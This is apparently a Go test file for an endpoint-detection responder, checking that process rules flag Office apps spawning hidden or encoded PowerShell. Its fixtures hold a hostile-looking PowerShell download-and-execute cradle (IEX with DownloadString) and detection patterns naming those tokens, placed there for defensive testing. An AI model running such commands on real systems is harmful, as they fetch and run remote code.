//go:build windows
// +build windows

package responder

import "testing"

func TestMatchesRule_OfficePowerShellChain(t *testing.T) {
	rule := ProcessRuleMatch{
		ParentNameAny:          []string{"winword.exe", "excel.exe"},
		NameAny:                []string{"powershell.exe"},
		CommandLineContainsAny: []string{" -enc ", "downloadstring"},
	}

	base := map[string]interface{}{
		"parent_name":      "WINWORD.EXE",
		"name":             "powershell.exe",
		"command_line":     `powershell.exe -NoP -W Hidden -enc AAAA`,
		"parent_executable": `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`,
	}
	if !matchesRule(rule, base) {
		t.Fatalf("expected rule to match office->powershell encoded chain")
	}
}

func TestMatchesRule_CommandLineContainsAll(t *testing.T) {
	rule := ProcessRuleMatch{
		NameAny:                []string{"powershell.exe"},
		CommandLineContainsAll: []string{"-nop", "iex", "downloadstring"},
	}

	base := map[string]interface{}{
		"name":         "powershell.exe",
		"command_line": `powershell.exe -NoP -W Hidden IEX (New-Object Net.WebClient).DownloadString('https://x')`,
	}
	if !matchesRule(rule, base) {
		t.Fatalf("expected all-substring match to succeed")
	}

	base["command_line"] = `powershell.exe -NoP Write-Host ok`
	if matchesRule(rule, base) {
		t.Fatalf("expected all-substring match to fail when one token is missing")
	}
}
